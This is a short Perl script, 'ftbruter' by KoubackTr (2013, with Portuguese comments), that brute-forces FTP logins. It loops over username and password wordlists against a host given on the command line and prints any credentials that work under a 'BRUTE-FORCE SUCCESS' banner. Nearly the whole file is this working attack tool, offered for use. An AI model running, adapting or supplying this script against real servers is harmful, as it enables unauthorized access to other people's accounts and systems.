#!/usr/bin/perl

use Net::FTP;
use Term::ANSIColor;

#MUDA O BANNER NÃO, O CORRETO É ESSA BAGUNÇA AI MESMO, NO FIM DÁ CERTO :)

system('clear'); #MUDAR clear PARA cls CASO SEJA WIDNOWS!

print color 'bold yellow';
print<<ftbruter;

======================================================
  _____  __ ___.                 __          v1.0      
_/ ____\\/  |\\_ |_________ __ ___/  |_  ___________ 
\\   __\\\\   __\\ __ \\_  __ \\  |  \\   __\\/ __ \\_  __ \\
 |  |   |  | | \\_\\ \\  | \\/  |  /|  | \\  ___/|  | \\/
 |__|   |__| |___  /__|  |____/ |__|  \\___  >__|   
                 \\/                       \\/       
======================================================
by KoubackTr      2013 
http://twitter.com/kouback_tr_
http://koubacktr.wordpress.com/
======================================================
ftbruter
print color 'reset';

#CONDIÇÃO
$host=$ARGV[0]|| die 
"\n USE: ftbruter <host>\n Ex: ./ftbruter.pl 10.0.0.1 \n";

# ARQUIVO WORDLIST DE USUARIOS (crie-o com este nome ou outro)
# Deve estar na mesma pasta do script ou editar o caminho
open(USUARIOS,"< ./users.txt") or die "users.txt not found\n"; 
chomp(my @user = <USUARIOS>); 


# ARQUIVO WORDLIST DE SENHAS (crie-o com este nome ou outro)
# Deve estar na mesma pasta do script ou editar o caminho
open(SENHAS,"< ./pass.txt") or die "pass.txt not found\n"; 
chomp(my @passs = <SENHAS>); 


#Escolhe nos arquivos, usuarios e senhas aleatorias para o brute...
foreach(sort @user){   
foreach my $pass (sort @passs){   

#Conexão FT?
my $f = Net::FTP->new("$host",
		Debug => 1,
		Passive=>0) or die "FTP server fail connection!!\n";

#RETORNO EM CASOS DE SUCESSO..,
if ($f->login($_,$pass)){
print "\t\n";
print color 'bold green';
print "[+]WOOOW BRUTE-FORCE SUCCCESS!!!!\n\n";
print color 'reset';
print color 'bold red';
print "[!]FTP-server: $host\n";
print "[!]FTP-user: $_\n";
print "[!]FTP-pass: $pass\n";
print color 'reset';
print "\n\n";
}
}
}